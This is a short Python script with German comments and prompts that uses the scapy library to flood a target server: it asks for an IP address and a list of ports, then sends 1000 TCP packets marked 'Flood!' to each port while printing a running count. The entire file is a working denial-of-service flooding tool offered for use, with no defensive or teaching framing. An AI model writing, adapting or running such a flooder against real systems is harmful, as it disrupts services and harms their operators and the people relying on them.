from scapy.all import *
import time
from colorama import init, Fore

# Initialisiere Colorama für farbigen Text
init(autoreset=True)

# Funktion zum Senden von Paketen an die angegebenen Ports
def flood_ports(target_ip, ports):
    count = 0
    for port in ports:
        try:
            for _ in range(1000):  # 1000 Pakete auf einmal pro Port senden
                send(IP(dst=target_ip)/TCP(dport=port)/b"Flood!")
                count += 1
                print(Fore.YELLOW + f"Port {port} an {target_ip} gesendet - Gesendete Pakete: {count}", end='\r')
        except:
            pass

def main():
    target_ip = input(Fore.GREEN + "Bitte gib die IP-Adresse des Servers ein: ")
    print(Fore.RED + f"Starte Überflutung von {target_ip}...")

    ports = [int(port) for port in input(Fore.YELLOW + "Bitte gib die Ports ein, die du überfluten möchtest (kommagetrennt): ").split(",")]

    flood_ports(target_ip, ports)
    print(Fore.RED + "\nÜberflutung beendet. Warte eine Minute, bevor das Programm beendet wird...")
    time.sleep(60)  # Warte eine Minute, bevor das Programm beendet wird

if __name__ == "__main__":
    main()
